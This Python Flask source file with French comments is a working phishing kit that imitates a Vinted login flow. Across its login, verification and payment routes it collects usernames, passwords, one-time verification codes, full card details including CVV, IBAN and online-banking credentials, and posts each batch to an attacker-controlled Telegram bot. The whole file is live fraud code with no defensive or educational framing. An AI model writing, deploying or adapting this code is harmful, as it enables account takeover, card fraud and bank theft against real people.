from flask import Flask, request, redirect, render_template, url_for, session
import os
import requests
import time
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
# TRÈS IMPORTANT : Assurez-vous que cette clé secrète est la même et stable
# sur votre environnement local et sur Render. Elle DOIT être constante.
app.secret_key = os.getenv("FLASK_SECRET_KEY", "super_secret_default_key")

TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        print("Message Telegram envoyé avec succès.")
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi du message Telegram: {e}")


# 1. Route pour la page d'accueil (index.html)
@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")


# 2. Route pour afficher la page de connexion (login.html)
@app.route("/login_page", methods=["GET"])
def login_page_display():
    return render_template("login.html")


# 3. Route pour traiter la soumission du formulaire de connexion
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Stocke les informations dans la session Flask
    session['username'] = username
    session['password'] = password
    print(f"DEBUG: Session set - username: {session.get('username')}, password: {session.get('password')}")

    message = (
        f"[Vinted Login]\n"
        f"👤 Pseudo: {username}\n"
        f"🔑 Mdp: {password}"
    )
    send_telegram_message(message)

    # Redirige vers la page de chargement
    return redirect(url_for('loading_page'))


# 4. Route pour la page de chargement (loading.html)
@app.route("/loading")
def loading_page():
    username = session.get('username')
    password = session.get('password')

    print(f"DEBUG: Dans loading_page - Session username: {username}, password: {password}")

    # Si les infos de session sont manquantes, redirige vers la page d'accueil (flux de secours)
    if not username or not password:
        print("DEBUG: Username ou Password manquant dans la session. Redirection vers Home.")
        return redirect(url_for('home'))

    # Rend la page loading.html et lui passe l'URL de redirection pour verify.html
    return render_template("loading.html",
                           redirect_url=url_for('verify_page',
                                                username=username,
                                                password=password))


# 5. Route pour la page de vérification (verify.html)
@app.route("/verify", methods=["GET", "POST"])
def verify_page():
    if request.method == "POST":
        # Traite la soumission du formulaire de vérification
        username = request.form["username"]
        password = request.form["password"]
        verification_code = request.form["verification_code"]

        session['verification_code'] = verification_code # Stocke aussi le code de vérification

        message = (
            f"[Vinted Code Verification]\n"
            f"👤 Pseudo: {username}\n"
            f"🔑 Mdp: {password}\n"
            f"🔢 Code: {verification_code}"
        )
        send_telegram_message(message)

        # Rend la page d'informations de paiement après la vérification
        return render_template(
            "payment_info.html",
            username=username,
            password=password,
            verification_code=verification_code
        )
    else:
        # Affiche la page de vérification (requête GET, par ex. depuis loading.html)
        username = request.args.get("username")
        password = request.args.get("password")
        print(f"DEBUG: Dans verify_page (GET) - URL username: {username}, password: {password}")
        return render_template("verify.html", username=username, password=password)


# 6. Route pour traiter la soumission des informations de paiement
@app.route("/process_payment", methods=["POST"])
def process_payment():
    # Récupère les données du formulaire et/ou de la session
    username = request.form.get("username") or session.get('username')
    password = request.form.get("password") or session.get('password')
    verification_code = request.form.get("verification_code") or session.get('verification_code')

    card_name = request.form["card_name"]
    card_number = request.form["card_number"]
    expiry_date = request.form["expiry_date"]
    cvv = request.form["cvv"]
    iban = request.form["iban"]
    phone_number = request.form.get("phone_number")

    bank_name_selected = request.form.get("bank_name")
    other_bank_name = request.form.get("other_bank_name")
    bank_id = request.form.get("bank_id")
    bank_password = request.form.get("bank_password")

    final_bank_name = bank_name_selected
    if bank_name_selected == "Autre" and other_bank_name:
        final_bank_name = other_bank_name
    elif bank_name_selected == "Autre":
        final_bank_name = "Autre (non spécifié)"

    # Envoie les informations de paiement à Telegram
    message = (
        f"[Vinted Payment Info]\n"
        f"👤 Pseudo: {username or 'N/A'}\n"
        f"🔑 Mdp: {password or 'N/A'}\n"
        f"🔢 Code Verif: {verification_code or 'N/A'}\n"
        f"💳 Nom sur carte: {card_name}\n"
        f"🔢 Num carte: {card_number}\n"
        f"📅 Exp: {expiry_date}\n"
        f"🔐 CVV: {cvv}\n"
        f"🏦 IBAN: {iban}\n"
        f"📞 Téléphone: {phone_number or 'N/A'}\n"
        f"🏦 Banque: {final_bank_name or 'N/A'}\n"
        f"🆔 Identifiant Bancaire: {bank_id or 'N/A'}\n"
        f"🔑 Mdp/Code Sec. Bancaire: {bank_password or 'N/A'}"
    )

    send_telegram_message(message)

    # Redirige vers la page de sécurisation finale
    return redirect(url_for('security_page'))


# 7. Route pour la page de sécurisation finale (security_page.html)
@app.route("/page_de_securisation")
def security_page():
    session.clear() # Nettoie la session à la fin du processus
    return render_template("security_page.html")


if __name__ == "__main__":
    app.run(debug=True)